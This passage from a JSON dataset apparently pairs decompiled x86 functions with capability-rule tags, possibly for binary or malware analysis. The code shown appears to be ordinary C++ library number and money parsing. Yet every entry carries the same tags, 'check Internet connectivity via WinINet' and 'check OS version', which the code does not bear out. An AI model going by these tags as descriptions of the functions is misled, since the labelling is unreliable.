(**0x4742a4)(unaff_EBP + -0x40);\n                            (*pcVar2)();\n                            iVar19 = *(unaff_EBP + -0x30);\n                            uVar17 = uVar8 | 0x3000;\n                            *(unaff_EBP + -0x60) = uVar17;\n                            *(unaff_EBP + -0x70) = uVar17;\n                            fcn.00430cd4();\n                            cVar5 = *(unaff_EBP + -0x59);\n                            if (iVar19 == 0) {\n                                *(unaff_EBP + -0x65) = 1;\n                            }\n                            goto code_r0x0042d77d;\n                        }\n                    }\n                    goto code_r0x0042d77a;\n                }\n                fcn.0042eb11();\n                pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                (**0x4742a4)(unaff_EBP + -0x40);\n                (*pcVar2)();\n                uVar17 = *(unaff_EBP + -0x60) | 0x100;\n                *(unaff_EBP + -0x60) = uVar17;\n                *(unaff_EBP + -0x70) = uVar17;\n                fcn.004294b3(unaff_EBP + -0x40);\n            }\n            fcn.00430cd4();\ncode_r0x0042d77a:\n            cVar5 = *(unaff_EBP + -0x59);\n        }\ncode_r0x0042d77d:\n        *(unaff_EBP + -0x80) = *(unaff_EBP + -0x80) + 1;\n        uVar8 = *(unaff_EBP + -0x80);\n    } while (cVar5 == '\\0');\n    if (*(unaff_EBP + -0x59) == '\\0') {\n        uVar8 = *(unaff_EBP + -0x48);\n        if (1 < uVar8) {\n            uVar17 = *(unaff_EBP + -0x44);\n            piVar14 = *(unaff_EBP + -0x58);\n            piVar18 = unaff_EBP + -0x58;\n            if (7 < uVar17) {\n                piVar18 = piVar14;\n            }\n            while( true ) {\n                piVar15 = unaff_EBP + -0x58;\n                if (7 < uVar17) {\n                    piVar15 = piVar14;\n                }\n                piVar18 = piVar18 + 1;\n                if (piVar18 == piVar15 + uVar8) goto code_r0x0042dfe4;\n                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                if (cVar5 != '\\0') break;\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(iVar1 + 6) != *piVar18) break;\n                fcn.0042eb11();\n                uVar17 = *(unaff_EBP + -0x44);\n                uVar8 = *(unaff_EBP + -0x48);\n                piVar14 = *(unaff_EBP + -0x58);\n            }\n            uVar17 = *(unaff_EBP + -0x44);\n            uVar8 = *(unaff_EBP + -0x48);\n            piVar14 = *(unaff_EBP + -0x58);\ncode_r0x0042dfe4:\n            piVar15 = unaff_EBP + -0x58;\n            if (7 < uVar17) {\n                piVar15 = piVar14;\n            }\n            if (piVar18 != piVar15 + uVar8) goto code_r0x0042e00b;\n        }\n        if (*(unaff_EBP + -0x65) != '\\0') {\n            fcn.00424fe8(0, 1, 0);\n        }\n    }\n    else {\ncode_r0x0042e00b:\n        fcn.004351bf(0);\n    }\n    fcn.00430cd4();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 7412
    },
    "0042e028": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042e028(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    bool bVar4;\n    char cVar5;\n    int16_t iVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    char *pcVar16;\n    uint32_t uVar17;\n    int32_t unaff_EBP;\n    int16_t *piVar18;\n    int32_t iVar19;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_60h;\n    uint var_59h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xa0);\n    *(unaff_EBP + -0x70) = 0;\n    iVar1 = *(unaff_EBP + 0xc);\n    uVar9 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -0x78) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x98) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x1c);\n    fcn.00421bb3(uVar9);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar7 = fcn.00428b27(unaff_EBP + -0x8c);\n        *(unaff_EBP + -100) = piVar7;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar7 = fcn.00428a81(unaff_EBP + -0x8c);\n        *(unaff_EBP + -100) = piVar7;\n    }\n    fcn.00401990();\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x65) = 0;\n    *(unaff_EBP + -0x59) = 0;\n    *(unaff_EBP + -0x44) = 7;\n    *(unaff_EBP + -0x58) = 0;\n    iVar19 = *piVar7;\n    *(unaff_EBP + -4) = 3;\n    pcVar2 = *(iVar19 + 0x2c);\n    (**0x4742a4)(unaff_EBP + -0x9c);\n    (*pcVar2)();\n    puVar3 = *(unaff_EBP + -0x78);\n    *(puVar3 + 0x10) = 0;\n    *(puVar3 + 0x14) = 0xf;\n    *puVar3 = 0;\n    uVar17 = 1;\n    *(unaff_EBP + -0x60) = 1;\n    uVar9 = *(*(unaff_EBP + -0x98) + 0x30);\n    *(unaff_EBP + -0x70) = 1;\n    fcn.00421bb3(uVar9);\n    *(unaff_EBP + -4) = 4;\n    piVar7 = fcn.004284ab(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x94) = piVar7;\n    fcn.00401990();\n    pcVar2 = *(*piVar7 + 0x2c);\n    (**0x4742a4)(0x475a10, \"0123456789-+Ee\", *(unaff_EBP + -0x90));\n    (*pcVar2)();\n    uVar8 = 0;\n    *(unaff_EBP + -0x80) = 0;\n    do {\n        if (3 < uVar8) break;\n        cVar5 = *(unaff_EBP + -0x9c + uVar8);\n        if (cVar5 == ' ') {\ncode_r0x0042e978:\n            if (*(unaff_EBP + -0x80) == 3) goto code_r0x0042e1a8;\n            *(unaff_EBP + -0x71) = 0;\n            cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n            if (cVar5 == '\\0') {\n                uVar9 = *(unaff_EBP + -0x6c);\n                do {\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    pcVar2 = *(**(unaff_EBP + -0x94) + 0x10);\n                    (**0x4742a4)(0x48, *(iVar1 + 6));\n                    cVar5 = (*pcVar2)();\n                    if (cVar5 == '\\0') break;\n                    *(unaff_EBP + -0x71) = 1;\n                    fcn.0042eb11();\n                    cVar5 = fcn.00435185(uVar9);\n                } while (cVar5 == '\\0');\n                uVar17 = *(unaff_EBP + -0x60);\n            }\n            if ((*(unaff_EBP + -0x9c + *(unaff_EBP + -0x80)) != ' ') || (*(unaff_EBP + -0x71) != '\\0'))\n            goto code_r0x0042e1a8;\n            cVar5 = '\\x01';\n            *(unaff_EBP + -0x59) = 1;\n        }\n        else {\n            if (cVar5 == '$') {\n                pcVar2 = *(**(unaff_EBP + -100) + 0x18);\n                (**0x4742a4)(unaff_EBP + -0x28);\n                (*pcVar2)();\n                uVar17 = uVar17 | 0x20;\n                *(unaff_EBP + -0x60) = uVar17;\n                *(unaff_EBP + -0x70) = uVar17;\n                uVar9 = *(unaff_EBP + -0x6c);\n                *(unaff_EBP + -4) = 5;\n                if (((*(*(unaff_EBP + -0x98) + 0x14) & 8) == 0) && (cVar5 = fcn.00435185(uVar9),  cVar5 == '\\0')) {\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    piVar14 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        piVar14 = *(unaff_EBP + -0x28);\n                    }\n                    if (*(iVar1 + 6) == *piVar14) goto code_r0x0042e8ad;\ncode_r0x0042e8e6:\n                    fcn.00435213(0);\n                }\n                else {\ncode_r0x0042e8ad:\n                    if ((*(unaff_EBP + -0x80) == 3) && (*(unaff_EBP + -0x48) < 2)) {\n                        cVar5 = fcn.00435185(uVar9);\n                        if (cVar5 == '\\0') {\n                            if (*(iVar1 + 4) == '\\0') {\n                                fcn.00430056();\n                            }\n                            piVar14 = unaff_EBP + -0x28;\n                            if (7 < *(unaff_EBP + -0x14)) {\n                                piVar14 = *(unaff_EBP + -0x28);\n                            }\n                            if (*(iVar1 + 6) == *piVar14) goto code_r0x0042e8f0;\n                        }\n                        goto code_r0x0042e8e6;\n                    }\n                }\ncode_r0x0042e8f0:\n                piVar14 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    piVar14 = *(unaff_EBP + -0x28);\n                }\n                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                if (cVar5 == '\\0') {\n                    uVar9 = *(unaff_EBP + -0x6c);\n                    do {\n                        iVar19 = unaff_EBP + -0x28;\n                        if (7 < *(unaff_EBP + -0x14)) {\n                            iVar19 = *(unaff_EBP + -0x28);\n                        }\n                        if (piVar14 == iVar19 + *(unaff_EBP + -0x18) * 2) break;\n                        if (*(iVar1 + 4) == '\\0') {\n                            fcn.00430056();\n                        }\n                        if (*(iVar1 + 6) != *piVar14) break;\n                        piVar14 = piVar14 + 1;\n                        fcn.0042eb11();\n                        cVar5 = fcn.00435185(uVar9);\n                    } while (cVar5 == '\\0');\n                    uVar17 = *(unaff_EBP + -0x60);\n                }\n                iVar19 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar19 = *(unaff_EBP + -0x28);\n                }\n                if (piVar14 != iVar19 + *(unaff_EBP + -0x18) * 2) {\n                    *(unaff_EBP + -0x59) = 1;\n                }\n                *(unaff_EBP + -4) = 3;\n            }\n            else {\n                if (cVar5 != '+') {\n                    if (cVar5 != 'v') {\n                        if (cVar5 == 'x') goto code_r0x0042e978;\n                        goto code_r0x0042e1a8;\n                    }\n                    *(unaff_EBP + -0x7c) = 0;\n                    pcVar2 = *(**(unaff_EBP + -100) + 0x24);\n                    (**0x4742a4)();\n                    uVar9 = (*pcVar2)();\n                    *(unaff_EBP + -0x84) = uVar9;\n                    pcVar2 = *(**(unaff_EBP + -100) + 0x14);\n                    (**0x4742a4)(unaff_EBP + -0x40);\n                    (*pcVar2)();\n                    uVar17 = uVar17 | 0x4000;\n                    *(unaff_EBP + -0x60) = uVar17;\n                    *(unaff_EBP + -0x70) = uVar17;\n                    *(unaff_EBP + -4) = 10;\n                    if (*(unaff_EBP + -0x30) == 0) {\ncode_r0x0042e44a:\n                        uVar9 = *(unaff_EBP + -0x6c);\n                        cVar5 = fcn.00435185(uVar9);\n                        if (cVar5 == '\\0') {\n                            do {\n                                if (*(iVar1 + 4) == '\\0') {\n                                    fcn.00430056();\n                                }\n                                uVar8 = fcn.0042758d(*(unaff_EBP + -0x90), *(iVar1 + 6));\n                                if (9 < uVar8) break;\n                                *(unaff_EBP + -0xa8) = *(uVar8 + 0x475a10);\n                                fcn.0040c5c0(*(unaff_EBP + -0xa8));\n                                fcn.0042eb11();\n                                cVar5 = fcn.00435185(uVar9);\n                            } while (cVar5 == '\\0');\n                            uVar17 = *(unaff_EBP + -0x60);\n                        }\ncode_r0x0042e4af:\n                        pcVar2 = *(**(unaff_EBP + -100) + 0xc);\n                        (**0x4742a4)();\n                        iVar6 = (*pcVar2)();\n                        cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                        if ((cVar5 == '\\0') && (iVar6 != 0)) {\n                            if (*(iVar1 + 4) == '\\0') {\n                                fcn.00430056();\n                            }\n                            if (*(iVar1 + 6) != iVar6) goto code_r0x0042e57e;\n                            fcn.0042eb11();\n                            cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                            iVar19 = *(unaff_EBP + -0x84);\n                            while (cVar5 == '\\0') {\n                                iVar12 = *(unaff_EBP + -0x7c);\n                                if (iVar19 <= iVar12) goto code_r0x0042e587;\n                                if (*(iVar1 + 4) == '\\0') {\n                                    fcn.00430056();\n                                }\n                                uVar8 = fcn.0042758d(*(unaff_EBP + -0x90), *(iVar1 + 6));\n                                if (9 < uVar8) break;\n                                *(unaff_EBP + -0x88) = *(uVar8 + 0x475a10);\n                                fcn.0040c5c0(*(unaff_EBP + -0x88));\n                                *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x7c) + 1;\n                                fcn.0042eb11();\n                                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                            }\n                            iVar12 = *(unaff_EBP + -0x7c);\n                            if (iVar12 < iVar19) {\n                                *(unaff_EBP + -0x59) = 1;\n                            }\n                        }\n                        else {\ncode_r0x0042e57e:\n                            iVar19 = *(unaff_EBP + -0x84);\n                            iVar12 = *(unaff_EBP + -0x7c);\n                        }\ncode_r0x0042e587:\n                        if (*(*(unaff_EBP + -0x78) + 0x10) == 0) {\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                        else if (iVar12 < iVar19) {\n                            iVar19 = iVar19 - iVar12;\n                            do {\n                                fcn.0040c5c0(0x30);\n                                iVar19 = iVar19 + -1;\n                            } while (iVar19 != 0);\n                            uVar17 = *(unaff_EBP + -0x60);\n                        }\n                    }\n                    else {\n                        pcVar2 = *(**(unaff_EBP + -100) + 0x10);\n                        (**0x4742a4)();\n                        uVar8 = (*pcVar2)();\n                        *(unaff_EBP + -0xa4) = uVar8 & 0xffff;\n                        if ((uVar8 & 0xffff) == 0) goto code_r0x0042e44a;\n                        puVar10 = unaff_EBP + -0x40;\n                        if (0xf < *(unaff_EBP + -0x2c)) {\n                            puVar10 = *(unaff_EBP + -0x40);\n                        }\n                        if (0x7e < *puVar10) goto code_r0x0042e44a;\n                        *(unaff_EBP + -0x14) = 0xf;\n                        *(unaff_EBP + -0x18) = 0;\n                        *(unaff_EBP + -0x28) = 0;\n                        fcn.0040acd0(1, 0);\n                        *(unaff_EBP + -4) = 0xb;\n                        iVar19 = 0;\n                        cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                        if (cVar5 == '\\0') {\n                            do {\n                                if (*(iVar1 + 4) == '\\0') {\n                                    fcn.00430056();\n                                }\n                                uVar8 = fcn.0042758d(*(unaff_EBP + -0x90), *(iVar1 + 6));\n                                if (uVar8 < 10) {\n                                    *(unaff_EBP + -0xa0) = *(uVar8 + 0x475a10);\n                                    fcn.0040c5c0(*(unaff_EBP + -0xa0));\n                                    iVar12 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        iVar12 = *(unaff_EBP + -0x28);\n                                    }\n                                    if (*(iVar12 + iVar19) != '\\x7f') {\n                                        iVar12 = unaff_EBP + -0x28;\n                                        if (0xf < *(unaff_EBP + -0x14)) {\n                                            iVar12 = *(unaff_EBP + -0x28);\n                                        }\n                                        *(iVar12 + iVar19) = *(iVar12 + iVar19) + '\\x01';\n                                    }\n                                }\n                                else {\n                                    iVar12 = *(unaff_EBP + -0x28);\n                                    iVar11 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        iVar11 = iVar12;\n                                    }\n                                    if (*(iVar11 + iVar19) == '\\0') goto code_r0x0042e3b0;\n                                    iVar6 = *(iVar1 + 6);\n                                    if (*(iVar1 + 4) == '\\0') {\n                                        fcn.00430056();\n                                        iVar6 = *(iVar1 + 6);\n                                        iVar12 = *(unaff_EBP + -0x28);\n                                    }\n                                    if (iVar6 != *(unaff_EBP + -0xa4)) goto code_r0x0042e3b0;\n                                    fcn.00406de0(1, 0);\n                                    iVar19 = iVar19 + 1;\n                                }\n                                fcn.0042eb11();\n                                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                            } while (cVar5 == '\\0');\n                            iVar12 = *(unaff_EBP + -0x28);\ncode_r0x0042e3b0:\n                            if (iVar19 == 0) goto code_r0x0042e3c6;\n                            iVar11 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                iVar11 = iVar12;\n                            }\n                            if ('\\0' < *(iVar11 + iVar19)) {\n                                iVar19 = iVar19 + 1;\n                                goto code_r0x0042e3c6;\n                            }\n                            cVar5 = '\\x01';\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                        else {\ncode_r0x0042e3c6:\n                            cVar5 = *(unaff_EBP + -0x59);\n                        }\n                        pcVar16 = unaff_EBP + -0x40;\n                        if (0xf < *(unaff_EBP + -0x2c)) {\n                            pcVar16 = *(unaff_EBP + -0x40);\n                        }\n                        if (cVar5 == '\\0') {\n                            while( true ) {\n                                if ((iVar19 == 0) || (cVar5 = *pcVar16,  cVar5 == '\\x7f')) goto code_r0x0042e425;\n                                iVar19 = iVar19 + -1;\n                                if (iVar19 != 0) break;\ncode_r0x0042e3fa:\n                                if (iVar19 == 0) {\n                                    pcVar13 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        pcVar13 = *(unaff_EBP + -0x28);\n                                    }\n                                    if (cVar5 < *pcVar13) goto code_r0x0042e421;\n                                }\n                                if ('\\0' < pcVar16[1]) {\n                                    pcVar16 = pcVar16 + 1;\n                                }\n                            }\n                            iVar12 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                iVar12 = *(unaff_EBP + -0x28);\n                            }\n                            if (cVar5 == *(iVar12 + iVar19)) goto code_r0x0042e3fa;\ncode_r0x0042e421:\n                            *(unaff_EBP + -0x59) = 1;\n                        }\ncode_r0x0042e425:\n                        fcn.00406810();\n                        if (*(unaff_EBP + -0x59) == '\\0') {\n                            *(unaff_EBP + -4) = 10;\n                            goto code_r0x0042e4af;\n                        }\n                    }\n                    *(unaff_EBP + -4) = 3;\n                    fcn.00406810();\n                    goto code_r0x0042e1a8;\n                }\n                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                if (cVar5 != '\\0') goto code_r0x0042e1a8;\n                pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                (**0x4742a4)(unaff_EBP + -0x28);\n                (*pcVar2)();\n                *(unaff_EBP + -4) = 6;\n                *(unaff_EBP + -0x60) = uVar17 | 0x42;\n                *(unaff_EBP + -0x70) = uVar17 | 0x42;\n                if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0042e64c:\n                    bVar4 = false;\n                }\n                else {\n                    pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                    (**0x4742a4)(unaff_EBP + -0x40);\n                    (*pcVar2)();\n                    *(unaff_EBP + -4) = 7;\n                    piVar14 = unaff_EBP + -0x40;\n                    *(unaff_EBP + -0x60) = uVar17 | 0xc6;\n                    *(unaff_EBP + -0x70) = uVar17 | 0xc6;\n                    if (7 < *(unaff_EBP + -0x2c)) {\n                        piVar14 = *(unaff_EBP + -0x40);\n                    }\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    if (*piVar14 != *(iVar1 + 6)) goto code_r0x0042e64c;\n                    bVar4 = true;\n                }\n                uVar8 = *(unaff_EBP + -0x60);\n                if ((uVar8 & 4) != 0) {\n                    *(unaff_EBP + -0x60) = uVar8 & 0xfffffffb;\n                    fcn.00406350();\n                    uVar8 = *(unaff_EBP + -0x60);\n                }\n                *(unaff_EBP + -4) = 3;\n                *(unaff_EBP + -0x60) = uVar8 & 0xfffffffd;\n                *(unaff_EBP + -0x70) = uVar8 & 0xfffffffd;\n                fcn.00406350();\n                if (!bVar4) {\n                    piVar7 = *(unaff_EBP + -100);\n                    pcVar2 = *(*piVar7 + 0x20);\n                    (**0x4742a4)(unaff_EBP + -0x28);\n                    (*pcVar2)();\n                    uVar8 = *(unaff_EBP + -0x60) | 0x208;\n                    *(unaff_EBP + -4) = 8;\n                    *(unaff_EBP + -0x60) = uVar8;\n                    *(unaff_EBP + -0x70) = uVar8;\n                    if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0042e74e:\n                        bVar4 = false;\n                    }\n                    else {\n                        pcVar2 = *(*piVar7 + 0x20);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar2)();\n                        piVar14 = unaff_EBP + -0x40;\n                        uVar8 = *(unaff_EBP + -0x60) | 0x410;\n                        *(unaff_EBP + -4) = 9;\n                        *(unaff_EBP + -0x60) = uVar8;\n                        *(unaff_EBP + -0x70) = uVar8;\n                        if (7 < *(unaff_EBP + -0x2c)) {\n                            piVar14 = *(unaff_EBP + -0x40);\n                        }\n                        if (*(iVar1 + 4) == '\\0') {\n                            fcn.00430056();\n                            uVar8 = *(unaff_EBP + -0x60);\n                        }\n                        if (*piVar14 != *(iVar1 + 6)) goto code_r0x0042e74e;\n                        bVar4 = true;\n                    }\n                    if ((uVar8 & 0x10) != 0) {\n                        *(unaff_EBP + -0x60) = uVar8 & 0xffffffef;\n                        fcn.00406350();\n                        uVar8 = *(unaff_EBP + -0x60);\n                    }\n                    *(unaff_EBP + -4) = 3;\n                    *(unaff_EBP + -0x60) = uVar8 & 0xfffffff7;\n                    *(unaff_EBP + -0x70) = uVar8 & 0xfffffff7;\n                    fcn.00406350();\n                    if (bVar4) {\n                        fcn.0042eb11();\n                        pcVar2 = *(**(unaff_EBP + -100) + 0x20);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar2)();\n                        uVar17 = *(unaff_EBP + -0x60) | 0x800;\n                        *(unaff_EBP + -0x60) = uVar17;\n                        *(unaff_EBP + -0x70) = uVar17;\n                        fcn.00404f80(unaff_EBP + -0x40);\n                        fcn.00406350();\n                        *(unaff_EBP + -0x65) = 1;\n                    }\n                    else {\n                        pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar2)();\n                        uVar8 = *(unaff_EBP + -0x60);\n                        iVar19 = *(unaff_EBP + -0x30);\n                        uVar17 = uVar8 | 0x1000;\n                        *(unaff_EBP + -0x60) = uVar17;\n                        *(unaff_EBP + -0x70) = uVar17;\n                        fcn.00406350();\n                        if (iVar19 != 0) {\n                            pcVar2 = *(**(unaff_EBP + -100) + 0x20);\n                            (**0x4742a4)(unaff_EBP + -0x40);\n                            (*pcVar2)();\n                            iVar19 = *(unaff_EBP + -0x30);\n                            uVar17 = uVar8 | 0x3000;\n                            *(unaff_EBP + -0x60) = uVar17;\n                            *(unaff_EBP + -0x70) = uVar17;\n                            fcn.00406350();\n                            cVar5 = *(unaff_EBP + -0x59);\n                            if (iVar19 == 0) {\n                                *(unaff_EBP + -0x65) = 1;\n                            }\n                            goto code_r0x0042e1ab;\n                        }\n                    }\n                    goto code_r0x0042e1a8;\n                }\n                fcn.0042eb11();\n                pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                (**0x4742a4)(unaff_EBP + -0x40);\n                (*pcVar2)();\n                uVar17 = *(unaff_EBP + -0x60) | 0x100;\n                *(unaff_EBP + -0x60) = uVar17;\n                *(unaff_EBP + -0x70) = uVar17;\n                fcn.00404f80(unaff_EBP + -0x40);\n            }\n            fcn.00406350();\ncode_r0x0042e1a8:\n            cVar5 = *(unaff_EBP + -0x59);\n        }\ncode_r0x0042e1ab:\n        *(unaff_EBP + -0x80) = *(unaff_EBP + -0x80) + 1;\n        uVar8 = *(unaff_EBP + -0x80);\n    } while (cVar5 == '\\0');\n    if (*(unaff_EBP + -0x59) == '\\0') {\n        uVar8 = *(unaff_EBP + -0x48);\n        if (1 < uVar8) {\n            uVar17 = *(unaff_EBP + -0x44);\n            piVar14 = *(unaff_EBP + -0x58);\n            piVar18 = unaff_EBP + -0x58;\n            if (7 < uVar17) {\n                piVar18 = piVar14;\n            }\n            while( true ) {\n                piVar15 = unaff_EBP + -0x58;\n                if (7 < uVar17) {\n                    piVar15 = piVar14;\n                }\n                piVar18 = piVar18 + 1;\n                if (piVar18 == piVar15 + uVar8) goto code_r0x0042ea12;\n                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                if (cVar5 != '\\0') break;\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(iVar1 + 6) != *piVar18) break;\n                fcn.0042eb11();\n                uVar17 = *(unaff_EBP + -0x44);\n                uVar8 = *(unaff_EBP + -0x48);\n                piVar14 = *(unaff_EBP + -0x58);\n            }\n            uVar17 = *(unaff_EBP + -0x44);\n            uVar8 = *(unaff_EBP + -0x48);\n            piVar14 = *(unaff_EBP + -0x58);\ncode_r0x0042ea12:\n            piVar15 = unaff_EBP + -0x58;\n            if (7 < uVar17) {\n                piVar15 = piVar14;\n            }\n            if (piVar18 != piVar15 + uVar8) goto code_r0x0042ea39;\n        }\n        if (*(unaff_EBP + -0x65) != '\\0') {\n            fcn.00424fe8(0, 1, 0);\n        }\n    }\n    else {\ncode_r0x0042ea39:\n        fcn.004351bf(0);\n    }\n    fcn.00406350();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 7420
    },
    "0042ea84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ea84(uint noname_0, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x28) == '\\0') {\n        uVar1 = *(arg_ch + 0x3c);\n    }\n    else {\n        uVar1 = *(arg_ch + 0x38);\n    }\n    uVar1 = fcn.0042ffc3(uVar1);\n    *(in_ECX + 0x10) = uVar1;\n    uVar1 = 0x4745ec;\n    if (*(arg_ch + 0x2e) < 5) {\n        uVar1 = *(arg_ch + 0x48);\n    }\n    uVar1 = fcn.0042ffc3(uVar1);\n    *(in_ECX + 0x14) = uVar1;\n    uVar1 = 0x475b0c;\n    if (*(arg_ch + 0x2f) < 5) {\n        uVar1 = *(arg_ch + 0x4c);\n    }\n    uVar1 = fcn.0042ffc3(uVar1);\n    *(in_ECX + 0x18) = uVar1;\n    *(in_ECX + 0xc) = **(arg_ch + 0x40);\n    *(in_ECX + 0xe) = **(arg_ch + 0x44);\n    return;\n}\n",
        "token_count": 326
    },
    "0042eb37": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0042eb37(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_40h;\n    uint var_14h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.0043ad3e(0x34);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    puVar2 = fcn.004257ac(unaff_EBP + -0x40);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iVar5 = fcn.0045b6c6();\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(extraout_ECX + 0x18) = 0;\n    uVar3 = *(iVar5 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0042170c(uVar3);\n    *(extraout_ECX + 8) = uVar3;\n    fcn.004278ba(0, iVar5);\n    if (*(extraout_ECX + 0x28) == '\\0') {\n        cVar1 = *(iVar5 + 0x29);\n    }\n    else {\n        cVar1 = *(iVar5 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(extraout_ECX + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(extraout_ECX + 0x1c) = 0;\n    }\n    fcn.0043000c(extraout_ECX + 0x20, *(iVar5 + 0x2b), *(iVar5 + 0x2a), *(iVar5 + 0x2e));\n    fcn.0043000c(extraout_ECX + 0x24, *(iVar5 + 0x2d), *(iVar5 + 0x2c), *(iVar5 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(extraout_ECX + 0x20) = 0x76782b24;\n        *(extraout_ECX + 0x24) = 0x76782b24;\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 703
    },
    "0042ec0d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
